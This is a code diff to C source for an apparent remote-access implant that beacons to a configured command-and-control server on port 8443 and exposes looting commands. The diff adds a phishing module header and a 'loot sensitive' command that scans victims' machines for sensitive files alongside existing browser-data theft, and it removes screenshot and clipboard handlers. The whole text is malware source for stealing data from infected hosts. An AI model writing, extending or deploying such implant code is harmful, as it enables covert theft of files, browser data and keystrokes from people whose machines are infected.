@@ -9,11 +9,12 @@
 #include "rdp.h"
 #include "keylog.h"
 #include "loot.h"
+#include "phish.h"
 #include "screenshot.h"
 #include "clipboard.h"
 
 // Configuration
-#define C2_SERVER "192.168.1.119"//"10.18.207.184"//"c2.s0p0wned.local"
+#define C2_SERVER "192.168.1.119"//"10.18.207.184"//"192.168.64.13"
 #define C2_PORT 8443
 #define BEACON_INTERVAL 10  // Secondes entre chaque beacon
 
@@ -350,24 +351,15 @@ void execute_command(const char *cmd, char *output, size_t output_size) {
             printf("[*] Searching for browser data...\n");
             loot_browser(output, output_size);
         }
+        else if (strcmp(loot_arg, "sensitive") == 0) {
+            printf("[*] Scanning for sensitive files...\n");
+            loot_sensitive(output, output_size);
+        }
         else {
             snprintf(output, output_size,
                     "[-] Unknown loot command\n"
-                    "[*] Available: loot sysinfo | find <pattern> | grab <file> | browser");
+                    "[*] Available: loot sysinfo | find <pattern> | grab <file> | browser | sensitive");
         }
-        return;
-    }
-
-    // Commande Screenshot
-    if (strncmp(cmd, "screenshot", 10) == 0) {
-        printf("[*] Taking screenshot...\n");
-        screenshot_grab(output, output_size);
-        return;
-    }
-
-    // Commande Clipboard
-    if (strncmp(cmd, "clipboard", 9) == 0) {
-        clipboard_get(output, output_size);
         return;
     }
 
